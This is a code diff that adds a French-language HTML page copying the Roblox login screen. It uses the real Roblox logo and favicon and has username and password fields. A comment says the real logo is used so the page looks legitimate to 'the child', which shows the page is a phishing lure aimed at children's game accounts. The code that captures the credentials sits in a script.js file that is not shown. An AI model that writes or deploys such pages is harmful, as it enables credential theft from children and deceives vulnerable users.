@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Accueil</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Icône pour l'onglet -->
+    <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo-area">
+            <!-- Logo Roblox (lien direct depuis leur CDN pour que ce soit legit aux yeux de l'enfant) -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox Logo" class="logo">
+        </div>
+        
+        <form id="loginForm" class="login-form">
+            <input type="text" id="username" name="username" placeholder="Mot de passe ou email" required>
+            <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+            
+            <button type="submit" class="login-btn">Se connecter</button>
+            
+            <div class="links">
+                <a href="#">J'ai oublié mon mot de passe</a>
+                <a href="#">S'inscrire</a>
+            </div>
+        </form>
+        
+        <div id="loading" class="hidden">
+            <p>Vérification en cours...</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
